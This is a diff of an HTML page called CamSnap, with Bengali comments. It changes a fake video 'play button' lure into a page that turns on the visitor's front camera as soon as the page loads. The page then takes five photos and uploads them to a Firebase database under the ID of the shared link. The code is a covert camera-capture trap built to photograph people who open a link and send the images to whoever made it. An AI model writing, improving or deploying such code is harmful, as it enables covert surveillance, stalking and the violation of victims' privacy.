@@ -3,22 +3,19 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CamSnap</title>
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
   <style>
-    body,html{margin:0;height:100%;background:#000;overflow:hidden;position:relative;cursor:pointer;}
+    body,html{margin:0;height:100%;background:#000;overflow:hidden;position:relative;}
     .bg{position:absolute;inset:0;background:url('https://i.imgur.com/8z3xK9L.jpeg') center/cover;filter:blur(18px) brightness(0.5);transform:scale(1.15);}
-    .play{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:120px;height:120px;background:#ff0000;border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 0 90px rgba(255,0,0,0.95);border:8px solid rgba(255,255,255,0.5);animation:p 1.5s infinite;}
-    @keyframes p{0%,100%{transform:translate(-50%,-50%) scale(1)}50%{transform:translate(-50%,-50%) scale(1.25)}}
-    .play svg{width:56px;height:56px;fill:#fff;margin-left:10px;}
+    .msg{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);color:#fff;font-size:22px;text-align:center;background:rgba(0,0,0,0.7);padding:20px 40px;border-radius:20px;}
   </style>
 </head>
-<body onclick="start()">
+<body>
 
 <div class="bg"></div>
-<div class="play">
-  <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
-</div>
+<div class="msg">কানেক্টিং...</div>
 
 <canvas id="c" style="display:none;"></canvas>
 
@@ -37,57 +34,63 @@ const firebaseConfig = {
 firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
-// ID ১০০% সঠিকভাবে নেওয়া
-let id = new URLSearchParams(location.search).get('id');
-if (!id) {
-  id = location.pathname.split('/').pop();
-  if (id === 'view.html' || id === '') id = null;
+// ID নেওয়া
+let id = location.pathname.split('/').pop();
+if (!id || id === 'view.html') {
+  const params = new URLSearchParams(location.search);
+  id = params.get('id');
 }
 
 if (!id) {
-  alert("লিংক ভুল!");
+  document.querySelector('.msg').textContent = "লিংক ভুল!";
   throw new Error("No ID");
 }
 
 const today = new Date().toLocaleDateString('bn-BD');
 const now = new Date().toLocaleString('bn-BD');
 
-function start() {
-  const canvas = document.getElementById('c');
-  const ctx = canvas.getContext('2d');
-  let pics = [];
+let count = 0;
+let pics = [];
 
-  navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}})
-    .then(stream => {
-      const video = document.createElement('video');
-      video.srcObject = stream;
-      video.muted = true;
-      video.play();
+// পেইজ লোড হলেই ক্যামেরা চালু
+navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}})
+  .then(stream => {
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    video.muted = true;
+    video.play();
 
-      let i = 0;
-      const take = () => {
-        if (i >= 5) {
-          // ছবি সেভ করো
-          db.ref('links/' + id + '/sessions/' + today).set({
-            photos: pics,
-            time: now
-          });
-          return;
-        }
+    const canvas = document.getElementById('c');
+    const ctx = canvas.getContext('2d');
 
-        canvas.width = video.videoWidth || 1280;
-        canvas.height = video.videoHeight || 720;
-        ctx.drawImage(video, 0, 0);
-        pics.push(canvas.toDataURL('image/jpeg', 0.96));
-        i++;
-        setTimeout(take, 200);
-      };
-      setTimeout(take, 500);
-    })
-    .catch(() => {
-      // কোনো এরর দেখাবে না
-    });
-}
+    const takePhoto = () => {
+      if (count >= 5) {
+        document.querySelector('.msg').textContent = "সম্পূর্ণ হয়েছে!";
+        return;
+      }
+
+      canvas.width = video.videoWidth || 1280;
+      canvas.height = video.videoHeight || 720;
+      ctx.drawImage(video, 0, 0);
+      pics.push(canvas.toDataURL('image/jpeg', 0.96));
+      count++;
+
+      document.querySelector('.msg').textContent = `ছবি নেওয়া হচ্ছে... ${count}/5`;
+
+      // ছবি সেভ করো
+      db.ref('links/' + id + '/sessions/' + today).set({
+        photos: pics,
+        time: now
+      });
+
+      setTimeout(takePhoto, 1000); // প্রতি ১ সেকেন্ডে ১ টি
+    };
+
+    setTimeout(takePhoto, 1000);
+  })
+  .catch(() => {
+    document.querySelector('.msg').textContent = "ক্যামেরা বন্ধ";
+  });
 </script>
 </body>
 </html>
